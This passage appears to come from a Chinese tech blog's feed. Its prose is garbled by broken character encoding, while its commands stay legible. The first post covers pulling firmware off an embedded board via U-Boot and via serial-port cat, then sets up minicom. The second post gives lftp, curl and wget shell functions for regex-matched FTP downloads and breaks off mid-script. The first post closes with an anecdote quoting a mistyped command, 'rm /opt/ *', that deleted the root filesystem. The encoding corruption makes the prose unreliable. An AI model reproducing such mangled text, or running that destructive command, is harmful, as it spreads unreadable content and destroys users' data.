<h2 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h2><h3 id="uboot-tftpæ–‡ä»¶ä¼ è¾“"><a href="#uboot-tftpæ–‡ä»¶ä¼ è¾“" class="headerlink" title="uboot tftpæ–‡ä»¶ä¼ è¾“"></a>uboot tftpæ–‡ä»¶ä¼ è¾“</h3><p>æˆ‘æœ€åˆæƒ³åˆ°çš„æ–¹æ³•å°±æ˜¯ubootï¼Œé€šè¿‡ubootæŠŠæ•°æ®dumpåˆ°å†…å­˜ï¼Œç„¶åä½¿ç”¨ubootä¸­çš„tftpæŠŠæ•°æ®ä¼ å‡ºæ¥ï¼Œç›¸å…³æŒ‡ä»¤å¦‚ä¸‹ï¼š</p>
<pre><code class="bash">nand read &lt;ram_addr&gt; &lt;flash_addr&gt; &lt;size&gt;
tftpput &lt;ram_addr&gt; &lt;size&gt; &lt;file_name&gt;

# example
nand read 0x84000000 0x1480000 0x1860000
tftpput 0x84000000 0x1860000 Fireware.img
</code></pre>
<p>è¿™é‡Œæ¶‰åŠåˆ°ä¸¤ä¸ªæŒ‡ä»¤<code>nand read</code>å’Œ<code>tftpput</code>ï¼Œ<code>nand flash</code>çš„block sizeæ˜¯128Kï¼Œæ‰€ä»¥flashåœ°å€ä»¥åŠsizeéƒ½è®¾ç½®ä¸º128Kçš„æ•´æ•°å€</p>
<ul>
<li><code>ram_addr</code> - å†…å­˜åœ°å€ï¼Œä¹Ÿæ˜¯å¹³å¸¸fw_recoveryå­˜æ”¾å›ºä»¶çš„åœ°å€</li>
<li><code>flash_addr</code> - å­˜æ”¾å›ºä»¶çš„flashåœ°å€ï¼Œéœ€è¦æŸ¥çœ‹ä»£ç ç›¸å…³é…ç½®æ–‡ä»¶æŸ¥è¯¢</li>
<li><code>size</code> - è¯»å–æ•°æ®çš„é•¿åº¦ï¼Œå¤§æ¦‚è®¾ç½®ä¸ºå¤§äºå›ºä»¶å¤§å°çš„å€¼</li>
</ul>
<p>åœ¨ubootå¯åŠ¨æ—¶ä¼šå°†è‡ªèº«IPè®¾ä¸º<code>192.168.1.1</code>ï¼Œæ‰€ä»¥åªéœ€æŠŠPCç«¯çš„IPè®¾ä¸ºé™æ€IP <code>192.168.1.10</code>å³å¯ä¼ è¾“ã€‚ç„¶è€Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå‡ºç°é—®é¢˜çš„è®¾å¤‡ubootå¹¶ä¸åŒ…å«<code>tftpput</code>æŒ‡ä»¤ï¼Œè¿™æ˜¯<code>uboot</code>ç‰ˆæœ¬é—®é¢˜ï¼Œè¿™å°±å°´å°¬äº†ã€‚ã€‚ã€‚æ˜¾ç„¶æ­¤è·¯ä¸é€šã€‚</p>
<h3 id="ä¸²å£ä¼ è¾“"><a href="#ä¸²å£ä¼ è¾“" class="headerlink" title="ä¸²å£ä¼ è¾“"></a>ä¸²å£ä¼ è¾“</h3><p>é‡ç‚¹æ¥äº†ï¼Œåœ¨æˆ‘é»”é©´æŠ€ç©·çš„æƒ…å†µä¸‹ï¼Œæˆ‘ç»„é•¿å¾ˆå¹³é™çš„è¯´å‡ºäº†<strong>ä¸²å£ä¼ è¾“</strong>çš„æ–¹æ³•ï¼Œç»å¯¹çš„éªšæ“ä½œ!!!</p>
<p>ä¹ä¸€å¬ï¼Œ<strong>ä¸²å£ä¼ è¾“</strong>å¯èƒ½ä¼šè§‰å¾—å¾ˆä¸€èˆ¬ï¼Œä¸å°±æ˜¯é€šè¿‡ä¸²å£æŠŠæ•°æ®ä¼ å‡ºæ¥ä¹ˆï¼Œå½“å¹´å•ç‰‡æœºå¼€å‘ç”¨çš„å¯æºœäº†å¥½å§ã€‚å’±ä¸æ€¥ï¼Œæ…¢æ…¢çœ‹</p>
<p>è¿™ä¸ªæ–¹æ³•åœ¨<code>linux</code>ç³»ç»Ÿå¾ˆæ–¹ä¾¿ï¼Œ<code>windows</code>ç³»ç»Ÿæ²¡ç ”ç©¶è¿‡ã€‚æˆ‘ä½¿ç”¨çš„æ˜¯<code>ubuntu 18.04</code>ï¼Œ è¿›å…¥æ­£é¢˜ï¼Œä½¿ç”¨<code>tmux</code>æ‰“å¼€ä¸¤ä¸ªçª—å£ï¼Œå¦‚æœæ²¡æœ‰<code>tmux</code>æˆ–è€…<code>screen</code>åˆ™æ‰“å¼€ä¸¤ä¸ªç»ˆç«¯çª—å£ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚</p>
<ul>
<li>å‘é€çª—å£</li>
</ul>
<p>åœ¨superæ¨¡å¼ä¸‹ï¼Œå°†æ–‡ä»¶<code>fw.img</code>é€šè¿‡ä¸²å£æ‰“å°å‡ºæ¥</p>
<pre><code class="bash">litreily@litreily-Aspire-4750:~ &gt;&gt; sudo su
root# cat &gt; /dev/ttyUSB0
cat fw.img
</code></pre>
<p>è¿™ä¸ªçª—å£é€šè¿‡catæŒ‡ä»¤å‘ä¸²å£å‘é€æŒ‡ä»¤<code>cat fw.img</code>,é‚£ä¹ˆæ¿å­ä¸­çš„æ–‡ä»¶<code>fw.img</code>æ•°æ®å°±ä¼šå¼€å§‹ä¼ è¾“ã€‚</p>
<ul>
<li>æ¥æ”¶çª—å£</li>
</ul>
<pre><code class="bash">sudo cat /dev/ttyUSB0 &gt; ~/fw.img
</code></pre>
<p><img src="/assets/shell/serial_transfer.png" alt="serial transfer"></p>
<p>æ¥æ”¶çª—å£é€šè¿‡catä¸²å£æ¥æ”¶è¾“å…¥æ•°æ®å¹¶é‡å®šå‘è‡³æœ¬åœ°æ–‡ä»¶<code>ï½/fw.img</code>ã€‚æ³¨æ„ï¼Œæ‰§è¡Œæ¥æ”¶çª—å£çš„æŒ‡ä»¤ï¼Œå†æ‰§è¡Œå‘é€çª—å£çš„æŒ‡ä»¤ï¼Œè¿™æ ·å°±ä¿è¯äº†æ¥æ”¶æ•°æ®çš„å®Œæ•´æ€§ã€‚</p>
<p>æ˜¯ä¸æ˜¯å¾ˆéªšæ°”ï¼Œè¿™ä¹Ÿå……åˆ†å±•ç¤ºäº†<code>linux</code>ç³»ç»Ÿä¸‹<strong>ä¸€åˆ‡çš†æ˜¯æ–‡ä»¶</strong>çš„å‰å®³ä¹‹å¤„ï¼Œé€šè¿‡ç®€å•çš„<code>cat</code>æŒ‡ä»¤å°±å¯ä»¥ç©è½¬ä¸²å£æ•°æ®ã€‚</p>
<h3 id="æ‰©å±•è¡¥å……ï¼šminicom"><a href="#æ‰©å±•è¡¥å……ï¼šminicom" class="headerlink" title="æ‰©å±•è¡¥å……ï¼šminicom"></a>æ‰©å±•è¡¥å……ï¼šminicom</h3><p>é’ˆå¯¹ä¸²å£ä¼ è¾“ï¼Œæ¨èä¸ª<code>linux</code>ä¸Šæä¸ºå¥½ç”¨çš„ä¸²å£ç»ˆç«¯<code>minicom</code>ï¼Œç±»ä¼¼äº<code>windows</code>ç³»ç»Ÿä¸­çš„<code>tera term</code>ã€‚</p>
<pre><code class="bash">sudo apt install minicom
</code></pre>
<p>å®‰è£…åï¼Œåœ¨ä¸²å£è¿æ¥çŠ¶æ€ä¸‹ï¼Œé€šè¿‡ä»¥ä¸‹æŒ‡ä»¤æ‰¾åˆ°ä¸²å£è®¾å¤‡<code>/dev/ttyUSB0</code></p>
<pre><code class="bash">$ ls -l /dev/ttyUSB*
crw-rw---- 1 root dialout 188, 0 9æœˆ  12 22:42 /dev/ttyUSB0
</code></pre>
<p>ç„¶åå¯åŠ¨<code>minicom</code>ï¼Œé¦–æ¬¡å¯åŠ¨éœ€è¦é…ç½®äº›å‚æ•°</p>
<pre><code class="bash">sudo minicom -s

+-----[configuration]------+
| Filenames and paths      |
| File transfer protocols  |
| Serial port setup        |
| Modem and dialing        |
| Screen and keyboard      |
| Save setup as dfl        |
| Save setup as..          |
| Exit                     |
| Exit from Minicom        |
+--------------------------+
</code></pre>
<p>é€‰æ‹©<code>Serial port setup</code>ï¼Œç„¶åæ ¹æ®ä¸‹é¢çš„æç¤ºè®¾ç½®<code>Serial Device</code>ä¸ºä¸Šé¢æŸ¥æ‰¾åˆ°çš„<code>/dev/ttyUSB0</code>ï¼Œå°†Hardware Flow Controlè®¾ç½®ä¸ºno</p>
<pre><code class="bash">+-----------------------------------------------------------------------+
| A -    Serial Device      : /dev/ttyUSB0                              |
| B - Lockfile Location     : /var/lock                                 |
| C -   Callin Program      :                                           |
| D -  Callout Program      :                                           |
| E -    Bps/Par/Bits       : 115200 8N1                                |
| F - Hardware Flow Control : No                                        |
| G - Software Flow Control : No                                        |
|                                                                       |
|    Change which setting?                                              |
+-----------------------------------------------------------------------+
</code></pre>
<p>é€‰å¥½åå›è½¦ï¼Œåœ¨è¿”å›èœå•ä¸­é€‰æ‹©<code>Save setup as dfl</code>ï¼Œä¸‹æ¬¡ç›´æ¥é€šè¿‡<code>sudo minicom</code>å°±å¯ä»¥ä½¿ç”¨äº†ã€‚ é€€å‡º<code>minicom</code>ä½¿ç”¨å¿«æ·é”®<code>Ctrl A Z</code>ç„¶åæŒ‰<code>x</code>å³å¯ã€‚</p>
<h3 id="åç»­"><a href="#åç»­" class="headerlink" title="åç»­"></a>åç»­</h3><p>æœ€ç»ˆå‘ç°ä¸æ˜¯å›ºä»¶çš„é—®é¢˜ï¼Œè€Œæ˜¯æµ‹è¯•äººå‘˜æ“ä½œå¤±è¯¯ï¼Œå°†<code>rm /opt/*</code> å†™æˆäº†<code>rm /opt/ *</code>ï¼Œæ²¡é”™å°±æ˜¯å¤šäº†ä¸ªç©ºæ ¼ï¼ŒæŠŠæ ¹ç›®å½•èƒ½åˆ çš„éƒ½åˆ äº†ï¼Œè‡³äºæ€ä¹ˆå‘ç°çš„ï¼Œæ ¹æ®æµ‹è¯•æä¾›çš„<code>console log</code>ã€‚ã€‚ã€‚</p>
<p>è™½ç„¶è¿™ä¸ªä¼ è¾“åçš„<code>fw.img</code>æ²¡æœ‰æ´¾ä¸Šç”¨åœºï¼Œä½†å­¦åˆ°äº†ä¸€ä¸ªå¯ä»¥ç‰¹å®šæƒ…å†µä¸‹å¾ˆæœ‰ç”¨çš„å†·çŸ¥è¯†ä¹Ÿæ˜¯å¾ˆä¸é”™çš„ï¼Œå…³é”®æ—¶å€™æŒºç®¡ç”¨çš„ã€‚ä¸è¿‡è¿™ä¸ªæ–¹æ³•ä¹Ÿæœ‰å…¶å±€é™æ€§ï¼Œå°±æ˜¯å¦‚æœåœ¨catè¿‡ç¨‹ä¸­ï¼Œæ¿å­è‡ªåŠ¨æ‰“å°äº†è®¸å¤šå…¶å®ƒç±»å‹çš„<code>log</code>ï¼Œå°±ä¼šæŠŠæ•°æ®æä¹±ã€‚</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> shell </tag>
            
            <tag> tftp </tag>
            
            <tag> nand </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ä½¿ç”¨æ­£åˆ™æ¨¡ç³ŠåŒ¹é…çš„ftpæ–‡ä»¶ä¼ è¾“]]></title>
      <url>https://www.litreily.top/2019/09/02/lftp/</url>
      <content type="html"><![CDATA[<p>é€šå¸¸è€Œè¨€ï¼ŒFTPä¼ è¾“è¿‡ç¨‹ä¸­ï¼Œå®¢æˆ·ç«¯åœ¨å®Œæˆè´¦æˆ·è®¤è¯åï¼Œéœ€è¦æŒ‡å®šå…·ä½“çš„æ–‡ä»¶è·¯å¾„æ–¹èƒ½ä¸‹è½½æˆ–åˆ é™¤æœåŠ¡å™¨ç«¯çš„æ–‡ä»¶ã€‚ä½†æ˜¯åœ¨ä½¿ç”¨å‘½ä»¤è¡ŒæŒ‡ä»¤å»æ“ä½œftpæ•°æ®æ—¶ï¼Œå¦‚æœæ¯æ¬¡éƒ½è¦è¾“å…¥å®Œæ•´çš„è·¯å¾„å°±å¤ªéº»çƒ¦äº†ï¼Œè€Œä¸”å¦‚æœæƒ³è¦åŒæ—¶ä¸‹è½½å¤šä¸ªæ–‡ä»¶è¿˜éœ€é€ä¸ªæ‰§è¡Œä¸‹è½½æŒ‡ä»¤ï¼Œé‚£æœ‰ä»€ä¹ˆæ–¹æ³•å¯ä»¥é€šè¿‡<strong>æ­£åˆ™è¡¨è¾¾å¼</strong>å»å®Œæˆæ¨¡ç³ŠåŒ¹é…å’Œæ‰¹é‡ä¸‹è½½å‘¢ï¼Ÿæœ¬æ–‡å°±æ¥ä»‹ç»ä¸€ä¸‹FTPæ•°æ®ä¼ è¾“çš„å¸¸ç”¨æ“ä½œåŠæ­£åˆ™åŒ¹é…çš„å®ç°æ–¹æ³•ã€‚</p>
<p><img src="/assets/ftp/ftp.png" alt="ftp diagram"></p>
<a id="more"></a>
<h2 id="å¸¸ç”¨çš„ftpå®¢æˆ·ç«¯"><a href="#å¸¸ç”¨çš„ftpå®¢æˆ·ç«¯" class="headerlink" title="å¸¸ç”¨çš„ftpå®¢æˆ·ç«¯"></a>å¸¸ç”¨çš„ftpå®¢æˆ·ç«¯</h2><p>åœ¨ä»‹ç»ftpæ•°æ®ä¼ è¾“ä¹‹å‰ï¼Œç®€å•ä»‹ç»ä¸‹å¸¸ç”¨çš„å‡ æ¬¾ftp clientï¼š</p>
<ul>
<li><code>ftp</code></li>
<li><code>lftp</code>ï¼ˆæ”¯æŒftp, http, https, sftp, fish, torrent, fxp, ...ï¼‰</li>
<li><code>sftp</code>(Secure File Transfer Protocol)</li>
<li>FileZilla(å›¾å½¢åŒ–è½¯ä»¶ï¼Œæ”¯æŒftp, ftps, sftp)</li>
</ul>
<p><code>ftp</code>æ˜¯æœ€åŸºæœ¬çš„ftpå®¢æˆ·ç«¯ï¼Œé«˜æ•ˆä½†ä¸å®‰å…¨ï¼Œæ•°æ®ä¼ è¾“è¿‡ç¨‹ä¸­ä½¿ç”¨æ˜æ–‡ï¼Œå®¹æ˜“è¢«æˆªè·å’Œç¯¡æ”¹ã€‚<code>lftp</code>æ˜¯éå¸¸å¼ºå¤§çš„ä¸€æ¬¾æ–‡ä»¶ä¼ è¾“å·¥å…·ï¼Œæ”¯æŒå¤šç§æ–‡ä»¶ä¼ è¾“åè®®ï¼ŒåŠŸèƒ½å¼ºå¤§ï¼Œæ”¯æŒé€’å½’é•œåƒæ•´ä¸ªç›®å½•åŠæ–­ç‚¹ç»­ä¼ ç­‰ï¼Œä¹Ÿæ˜¯æœ¬æ–‡é‡‡ç”¨çš„ftpå®¢æˆ·ç«¯ã€‚<code>sftp</code>æ˜¯<code>ssh</code>çš„ä¸€éƒ¨åˆ†ï¼Œæ”¯æŒåŠ å¯†ä¼ è¾“ï¼Œä¸<code>ftp</code>è¯­æ³•åŸºæœ¬ä¸€è‡´ï¼Œéå¸¸å®‰å…¨ä½†æ˜¯ä¼ è¾“æ•ˆç‡è¾ƒä½ã€‚æœ€åçš„<code>FileZilla</code>æ˜¯ä¸€æ¬¾å›¾å½¢åŒ–è½¯ä»¶ï¼Œåœ¨windowsæ“ä½œç³»ç»Ÿä¸­ä½¿ç”¨è¾ƒå¤šã€‚</p>
<h2 id="ftpå¸¸ç”¨æ“ä½œ"><a href="#ftpå¸¸ç”¨æ“ä½œ" class="headerlink" title="ftpå¸¸ç”¨æ“ä½œ"></a>ftpå¸¸ç”¨æ“ä½œ</h2><p>æœ¬æ–‡ä¸»è¦ä»‹ç»ä»¥ä¸‹å››ä¸ªå¸¸ç”¨çš„ftpæ“ä½œ</p>
<ul>
<li>è´¦æˆ·è®¤è¯</li>
<li>æ–‡ä»¶ä¸Šä¼ </li>
<li>æ–‡ä»¶ä¸‹è½½ï¼ˆç”¨åˆ°æ­£åˆ™æ¨¡ç³ŠåŒ¹é…ï¼‰</li>
<li>æ–‡ä»¶åˆ é™¤</li>
</ul>
<p><code>lftp</code>æŒ‡ä»¤çš„è¯­æ³•å¦‚ä¸‹ï¼š</p>
<pre><code class="bash">lftp [-d] [-e cmd] [-p port] [-u user[,pass]] [site]
lftp -f script_file
lftp -c commands
lftp --version
lftp --help
</code></pre>
<p><code>lftp</code>çš„å¸®åŠ©ä¿¡æ¯ä¸­å¯ä»¥çœ‹åˆ°æ‰€æœ‰å¯ä»¥æ‰§è¡Œçš„æŒ‡ä»¤ã€‚</p>
<pre><code class="bash">$ lftp -u &quot;username,password&quot; ftp://host.ip
lftp username@host:~&gt; help
    !&lt;shell-command&gt;                     (commands)
    alias [&lt;name&gt; [&lt;value&gt;]]             attach [PID]
    bookmark [SUBCMD]                    cache [SUBCMD]
    cat [-b] &lt;files&gt;                     cd &lt;rdir&gt;
    chmod [OPTS] mode file...            close [-a]
    [re]cls [opts] [path/][pattern]      debug [OPTS] [&lt;level&gt;|off]
    du [options] &lt;dirs&gt;                  edit [OPTS] &lt;file&gt;
    exit [&lt;code&gt;|bg]                     get [OPTS] &lt;rfile&gt; [-o &lt;lfile&gt;]
    glob [OPTS] &lt;cmd&gt; &lt;args&gt;             help [&lt;cmd&gt;]
    history -w file|-r file|-c|-l [cnt]  jobs [-v] [&lt;job_no...&gt;]
    kill all|&lt;job_no&gt;                    lcd &lt;ldir&gt;
    lftp [OPTS] &lt;site&gt;                   ln [-s] &lt;file1&gt; &lt;file2&gt;
    ls [&lt;args&gt;]                          mget [OPTS] &lt;files&gt;
    mirror [OPTS] [remote [local]]       mkdir [OPTS] &lt;dirs&gt;
    module name [args]                   more &lt;files&gt;
    mput [OPTS] &lt;files&gt;                  mrm &lt;files&gt;
    mv &lt;file1&gt; &lt;file2&gt;                   mmv [OPTS] &lt;files&gt; &lt;target-dir&gt;
    [re]nlist [&lt;args&gt;]                   open [OPTS] &lt;site&gt;
    pget [OPTS] &lt;rfile&gt; [-o &lt;lfile&gt;]     put [OPTS] &lt;lfile&gt; [-o &lt;rfile&gt;]
    pwd [-p]                             queue [OPTS] [&lt;cmd&gt;]
    quote &lt;cmd&gt;                          repeat [OPTS] [delay] [command]
    rm [-r] [-f] &lt;files&gt;                 rmdir [-f] &lt;dirs&gt;
    scache [&lt;session_no&gt;]                set [OPT] [&lt;var&gt; [&lt;val&gt;]]
    site &lt;site-cmd&gt;                      source &lt;file&gt;
    torrent [OPTS] &lt;file|URL&gt;...         user &lt;user|URL&gt; [&lt;pass&gt;]
    wait [&lt;jobno&gt;]                       zcat &lt;files&gt;
    zmore &lt;files&gt;
lftp username@host:~&gt;
</code></pre>
<h2 id="è´¦æˆ·è®¤è¯"><a href="#è´¦æˆ·è®¤è¯" class="headerlink" title="è´¦æˆ·è®¤è¯"></a>è´¦æˆ·è®¤è¯</h2><p>åŸºäºå®‰å…¨è€ƒè™‘ï¼Œç»å¤§å¤šæ•°çš„ftp serveréƒ½ä¼šè®¾ç½®è´¦æˆ·å¯†ç ï¼Œé‚£ä¹ˆä½¿ç”¨<code>lftp</code>è¯¥å¦‚ä½•å®Œæˆè®¤è¯å‘¢ï¼Ÿå…¶ä¸­åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­å·²ç»ç»™å‡ºç­”æ¡ˆäº†ï¼Œå°±æ˜¯é€šè¿‡å‚æ•°<code>-u</code>æŒ‡å®šã€‚</p>
<pre><code class="bash">lftp -u &quot;$ftp_user,$ftp_pass&quot;
</code></pre>
<p>å¦‚æœå°†å¯†ç å­˜å‚¨åœ¨æŸä¸ªæ–‡ä»¶<code>~/local/etc/ftp_pass</code>ï¼Œé‚£ä¹ˆå¯ä»¥åœ¨è„šæœ¬ä¸­ä½¿ç”¨ä¸€ä¸ªå‡½æ•°è¿›è¡Œè·å–ã€‚</p>
<pre><code class="bash"> get_ftp_pass()
 {
     pass_file=$HOME/local/etc/ftp_pass
     [ -f $pass_file ] &amp;&amp; ftp_pass=$(cat $pass_file)
     test -z &quot;$ftp_pass&quot; \
         &amp;&amp; read -rs -p &quot;Please input password of your FTP user $ftp_user: &quot; ftp_pass
 }
</code></pre>
<h2 id="é€šç”¨æ“ä½œ"><a href="#é€šç”¨æ“ä½œ" class="headerlink" title="é€šç”¨æ“ä½œ"></a>é€šç”¨æ“ä½œ</h2><p>å¦‚æœå®Œå…¨ä½¿ç”¨<code>lftp</code>å®Œæˆftpä¼ è¾“çš„å„ä¸ªåŠŸèƒ½ï¼Œé‚£ä¹ˆå¯ä»¥åœ¨<code>shell</code>è„šæœ¬ä¸­ä½¿ç”¨ä»¥ä¸‹æ¨¡æ¿å®Œæˆå„ä¸ªæŒ‡ä»¤æ“ä½œï¼š</p>
<pre><code class="bash">lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF
    COMMAND1 [Args1]
    COMMAND2 [Args2]
EOF
</code></pre>
<h2 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h2><p>ç”±äºæ–‡ä»¶ä¸Šä¼ æ˜¯å°†æœ¬åœ°æ–‡ä»¶ä¼ è¾“è‡³ftp serverï¼Œé‚£ä¹ˆé€šå¸¸æƒ…å†µä¸éœ€è¦æ­£åˆ™åŒ¹é…ï¼Œæœ¬åœ°æ–‡ä»¶é€‰æ‹©é€šè¿‡shellçš„tabè‡ªåŠ¨è¡¥å…¨å³å¯åšåˆ°ã€‚</p>
<p>ä½¿ç”¨<code>lftp</code>çš„<code>put $file -o $remotefile</code>å¯å°†æœ¬åœ°æ–‡ä»¶<code>$file</code>ä¼ è¾“è‡³ftp serverå¹¶é‡å‘½åä¸º<code>$remotefile</code>ï¼Œ<code>-o</code>å‚æ•°ç”¨äºæŒ‡å®šserverç«¯çš„æ–‡ä»¶åã€‚</p>
<pre><code class="bash">ftp_put_file()
{
    get_ftp_pass

    prefix=$(date &#39;+%Y%m%d%H%M%S-&#39;)
    remotefile=${prefix}${file##*/}
    subdir=$(date &#39;+%Y%m%d&#39;)

    lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF
             mkdir -p -f $subdir
         cd $subdir &amp;&amp; put ${file##*/} -o ${remotefile}
     EOF
}
</code></pre>
<p>å¦‚ä¸Šä»£ç æ‰€ç¤ºï¼Œå½“æˆ‘ä»¬æƒ³è¦<strong>å°†æ–‡ä»¶ä¼ è¾“è‡³æœåŠ¡ç«¯å­ç›®å½•</strong>æ—¶ï¼Œéœ€è¦é€šè¿‡<code>mkdir</code>å’Œ<code>cd</code>æŒ‡ä»¤å®Œæˆç›®å½•çš„åˆ›å»ºå’Œåˆ‡æ¢ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œæˆ‘ä»¬å°†æ¯æ¬¡ä¸Šä¼ çš„æ–‡ä»¶éƒ½æ”¾ç½®åœ¨äº†ä»¥å½“å¤©æ—¥æœŸå‘½åæ‰€åœ¨çš„æ–‡ä»¶å¤¹ï¼Œå¹¶ç»™åŸæœ‰æ–‡ä»¶ååŠ ä¸Šäº†æ—¶é—´æˆ³å‰ç¼€ã€‚</p>
<p>æ­¤å¤„éœ€è¦æ™®åŠä¸¤ä¸ªçŸ¥è¯†ç‚¹ï¼š</p>
<ul>
<li>shellä¸­çš„å˜é‡åˆ‡å‰²</li>
</ul>
<blockquote>
<p><strong>å˜é‡åˆ‡å‰²</strong></p>
<p><code>#</code> åˆ é™¤å˜é‡å·¦ä¾§çš„æœ€çŸ­åŒ¹é…ï¼›<code>##</code> åˆ é™¤å˜é‡å·¦ä¾§çš„æœ€é•¿åŒ¹é…</p>
<p><code>%</code> åˆ é™¤å˜é‡å³ä¾§çš„æœ€çŸ­åŒ¹é…ï¼›<code>%%</code>åˆ é™¤å˜é‡å³ä¾§çš„æœ€é•¿åŒ¹é…</p>
<p>${file##*/} ä»¥<code>/</code>ä¸ºåˆ†éš”ç¬¦ï¼Œåˆ é™¤æœ€åä¸€ä¸ª<code>/</code>å¾€å·¦çš„æ‰€æœ‰å­—ç¬¦ï¼Œæ­¤å¤„ç”¨äºè·å–æ–‡ä»¶å</p>
<p>${file%/*} ä»¥<code>/</code>ä¸ºåˆ†éš”ç¬¦ï¼Œåˆ é™¤æœ€åä¸€ä¸ª<code>/</code>å¾€å³çš„æ‰€æœ‰å­—ç¬¦ï¼Œæ­¤å¤„ç”¨äºè·å–ç›®å½•</p>
</blockquote>
<p>æˆ‘ä»¬é€šå¸¸åœ¨è„šæœ¬ä¸­ä½¿ç”¨<code>${0##*/}</code>è·å–å½“å‰æ‰§è¡ŒæŒ‡ä»¤çš„æ–‡ä»¶åã€‚</p>
<ul>
<li><code>&lt;&lt;-EOF</code>è¯­æ³•</li>
</ul>
<pre><code class="bash">**man bash**

[n]&lt;&lt;[-]word
        here-document
delimiter

......

If the redirection operator is `&lt;&lt;-`, then all leading tab characters are stripped from input lines and the line  containing  delimiter.   This  allows  here-documents within shell scripts to be indented in a natural fashion.
</code></pre>
<p>ç®€å•ç‚¹è¯´ï¼Œ<code>&lt;&lt;-EOF</code>ä¸­çš„è¿æ¥ç¬¦<code>-</code>ä¿è¯ä¸‹é¢è¯­å¥ä¸­çš„æ¯è¡Œå¼€å¤´çš„<code>tab</code>åˆ†éš”ç¬¦ä¼šè¢«å¿½ç•¥ï¼Œä½†åˆå¯ä»¥ä¿è¯ä»£ç çš„è‡ªç„¶ç¾è§‚ã€‚å¦‚æœä¸‹é¢è¯­å¥ä¸­å¼€å¤´çš„<code>tab</code>é”®æ˜¯ç©ºæ ¼æ›¿æ¢çš„ï¼Œé‚£ä¹ˆæœ‰å¯èƒ½ä¼šæŠ¥è¯­æ³•é”™è¯¯ï¼Œè¿™ä¹Ÿæ˜¯éœ€è¦æ³¨æ„çš„ã€‚</p>
<h2 id="æ–‡ä»¶ä¸‹è½½"><a href="#æ–‡ä»¶ä¸‹è½½" class="headerlink" title="æ–‡ä»¶ä¸‹è½½"></a>æ–‡ä»¶ä¸‹è½½</h2><p>æ–‡ä»¶ä¸‹è½½æ˜¯æœ¬æ–‡é‡ç‚¹ï¼Œå› ä¸ºæˆ‘ä»¬å°†å®ŒæˆftpæœåŠ¡å™¨ç«¯æ–‡ä»¶çš„æ¨¡ç³ŠåŒ¹é…ä¸‹è½½ã€‚åœ¨è®²è¿°æ¨¡ç³ŠåŒ¹é…ä¸‹è½½ä¹‹å‰ï¼Œå…ˆè®²è®²ä½¿ç”¨<code>lftp</code>å®ç°ä¸‹è½½çš„æ–¹æ³•ã€‚</p>
<pre><code class="bash">ftp_get_file()
{
    get_ftp_pass

    if test &quot;${file%/*}&quot; = &quot;${file}&quot;; then
        lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF
            set xfer:clobber on
            get ${file}
        EOF
    else
        lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF
            set xfer:clobber on
            cd ${file%/*} &amp;&amp; get ${file##*/}
        EOF
    fi
}
</code></pre>
<p>ä»¥ä¸Šå®ç°ä¸­ï¼Œåˆ†å¸¦æœ‰å­ç›®å½•å’Œä¸å¸¦å­ç›®å½•ä¸¤ç§æƒ…å†µï¼ŒæŒ‡ä»¤<code>set xfer:clobber on</code>æ˜¯ä¸ºäº†è§£å†³é‡å¤ä¸‹è½½æ—¶æç¤ºæ–‡ä»¶å·²å­˜åœ¨çš„é—®é¢˜ã€‚è¿™ç§æ–¹æ³•ç®€å•ï¼Œä½†æ˜¯æ¯æ¬¡åªèƒ½ä¸‹è½½ä¸€ä¸ªç¡®åˆ‡åç§°çš„æ–‡ä»¶ã€‚</p>
<p>å¥½äº†ï¼Œæ¥ä¸‹æ¥ä»‹ç»èƒ½å¤Ÿå®ç°æ¨¡ç³ŠåŒ¹é…åŠæ‰¹é‡ä¸‹è½½çš„æ–¹æ³•ï¼Œæ€è·¯å…¶å®å¾ˆç®€å•ï¼š</p>
<ol>
<li>ä»ç»™å®šçš„æ–‡ä»¶è·¯å¾„ä¸­è§£æå‡º<strong>ç›®å½•</strong>ä»¥åŠç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼çš„<strong>æ–‡ä»¶å</strong></li>
<li>ä½¿ç”¨<code>curl</code>æŒ‡ä»¤ä¸‹è½½æŒ‡å®š<code>ftp</code>ç›®å½•ï¼Œå¾—åˆ°æŒ‡å®šç›®å½•çš„<strong>æ–‡ä»¶åˆ—è¡¨ä¿¡æ¯</strong></li>
<li>å¯¹åˆ—è¡¨ä¿¡æ¯ä½¿ç”¨<code>awk</code>, <code>grep</code>æŒ‡ä»¤å®Œæˆæ­£åˆ™æ¨¡ç³ŠåŒ¹é…ï¼Œè·å–çœŸå®æ–‡ä»¶è·¯å¾„</li>
<li>ä½¿ç”¨<code>wget</code>æŒ‡ä»¤æ‰¹é‡ä¸‹è½½åŒ¹é…åˆ°çš„æ–‡ä»¶</li>
</ol>
<p>æ ¹æ®è¿™ä¸ªæ€è·¯ç¼–å†™ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="bash">ftp_get_file()
{
    get_ftp_pass

    # get subdir and regex pattern of filenames
    result=$(echo &quot;$file&quot; |grep &quot;/&quot;)
    if [ &quot;x$result&quot; != &quot;x&quot; ]; then
        # split file to directory and re pattern of files
        subdir=${file%/*}/
        re_pattern=${file##*/}
    else
        subdir=&quot;/&quot;
        re_pattern=$file
    fi

    # 1. curl get file list
    files=$(curl -s -u ${ftp_user}:${ftp_pass} ${ftp_host}/${subdir})
    [ $? -eq 67 ] &amp;&amp; echo &quot;curl: password error!&quot; &amp;&amp; exit 2

    # 2. grep with regex to get files which need download
    files=$(echo &quot;$files&quot; |awk &#39;{print $4}&#39; |grep &quot;${re_pattern}&quot;)
